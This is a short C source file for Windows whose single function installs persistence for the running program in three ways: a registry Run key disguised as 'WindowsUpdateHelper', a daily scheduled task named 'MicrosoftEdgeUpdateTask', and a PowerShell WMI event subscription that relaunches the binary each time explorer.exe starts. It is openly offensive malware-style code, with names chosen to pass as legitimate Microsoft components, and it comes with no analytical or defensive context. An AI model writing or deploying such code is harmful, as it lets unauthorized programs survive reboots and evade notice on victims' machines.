#include <windows.h>
#include <stdio.h>

void InstallPersistence() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    // Registry Run
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "WindowsUpdateHelper", 0, REG_SZ, (BYTE*)path, strlen(path)+1);
    RegCloseKey(hKey);

    // Scheduled Task
    char cmd[512];
    sprintf(cmd, "schtasks /create /tn \"MicrosoftEdgeUpdateTask\" /tr \"%s\" /sc daily /f", path);
    system(cmd);

    // WMI (PowerShell)
    char wmiCmd[1024];
    sprintf(wmiCmd, "powershell -Command \"Register-WmiEvent -Query \\\"SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'\\\" -Action { Start-Process '%s' }\"", path);
    system(wmiCmd);
}